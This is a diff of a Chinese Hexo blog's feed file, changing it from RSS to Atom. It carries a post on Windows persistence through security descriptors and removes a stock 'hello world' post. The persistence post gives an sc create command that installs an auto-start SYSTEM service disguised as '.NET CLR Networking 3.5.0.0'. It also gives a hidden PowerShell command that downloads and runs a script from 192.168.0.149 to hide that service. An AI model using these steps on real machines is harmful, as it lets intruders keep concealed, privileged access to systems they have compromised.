@@ -1,21 +1,16 @@
 <?xml version="1.0"?>
-<rss version="2.0">
-    <channel>
-        <title>竹林寺</title>
-        <link>http://example.com</link>
-        <description>请我喝咖啡！ψ(｀∇´)ψ</description>
-        <language>zh-CN</language>
-        <pubDate>Mon, 22 Jan 2024 00:30:34 +0800</pubDate>
-        <lastBuildDate>Mon, 22 Jan 2024 00:30:34 +0800</lastBuildDate>
-        <category>权限维持</category>
-        <category>我的博客</category>
-        <item>
-            <guid isPermalink="true">http://example.com/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</guid>
-            <title>win权限维持/安全描述符权限维持</title>
-            <link>http://example.com/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</link>
-            <category>权限维持</category>
-            <pubDate>Mon, 22 Jan 2024 00:30:34 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;竹林寺&lt;/strong&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://example.com</id>
+    <title>竹林寺 • Posts by &#34;权限维持&#34; tag</title>
+    <link href="http://example.com" />
+    <updated>2024-01-21T16:30:34.000Z</updated>
+    <category term="权限维持" />
+    <category term="我的博客" />
+    <entry>
+        <id>http://example.com/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</id>
+        <title>win权限维持/安全描述符权限维持</title>
+        <link rel="alternate" href="http://example.com/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
+        <content type="html">&lt;p&gt;&lt;strong&gt;竹林寺&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;cmd powershell 二选一&lt;/strong&gt;&lt;/p&gt;
 &lt;h2 id=&#34;1cmd创建自启动服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1cmd创建自启动服务&#34;&gt;#&lt;/a&gt; 1.cmd 创建自启动服务&lt;/h2&gt;
 &lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sc create &amp;quot;.NET CLR Networking 3.5.0.0&amp;quot; binpath= &amp;quot;cmd.exe /k C:\test.txt&amp;quot; depend= Tcpip obj= Localsystem start= auto  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
@@ -36,29 +31,8 @@
 &lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;powershell.exe -exec bypass -nop -w hidden -c &amp;quot;IEX((new-object&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net.webclient).downloadstring(&amp;#x27;http://192.168.0.149/1.ps1&amp;#x27;));Server-Sddl-Change -&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Name &amp;#x27;.NET CLR Networking 3.5.0.0&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;h2 id=&#34;8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏&#34;&gt;#&lt;/a&gt; 8. .NET CLR Networking 3.5.0.0 改成你的服务名 从下图可见已将值从该服务项中隐藏：&lt;/h2&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://cdn.nlark.com/yuque/0/2022/png/22015580/1645973492501-06b273bb-dd0f-4db0-bc84-0af6838061a7.png#averageHue=%23fbfaf9&amp;amp;clientId=ua1aa948f-0eae-4&amp;amp;from=paste&amp;amp;height=259&amp;amp;id=ua87b4a87&amp;amp;originHeight=259&amp;amp;originWidth=926&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=61070&amp;amp;status=done&amp;amp;style=none&amp;amp;taskId=u375f7037-0514-4820-aa72-7d5fd3ea1d0&amp;amp;title=&amp;amp;width=926&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://example.com/2024/01/22/life/hello-world/</guid>
-            <title>你好</title>
-            <link>http://example.com/2024/01/22/life/hello-world/</link>
-            <category>我的博客</category>
-            <pubDate>Mon, 22 Jan 2024 00:30:34 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;Welcome to &lt;a href=&#34;https://hexo.io/&#34;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&#34;https://hexo.io/docs/&#34;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&#34;https://hexo.io/docs/troubleshooting.html&#34;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&#34;https://github.com/hexojs/hexo/issues&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
-&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
-&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/writing.html&#34;&gt;Writing&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/server.html&#34;&gt;Server&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/generating.html&#34;&gt;Generating&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/one-command-deployment.html&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-    </channel>
-</rss>
+</content>
+        <category term="权限维持" />
+        <updated>2024-01-21T16:30:34.000Z</updated>
+    </entry>
+</feed>
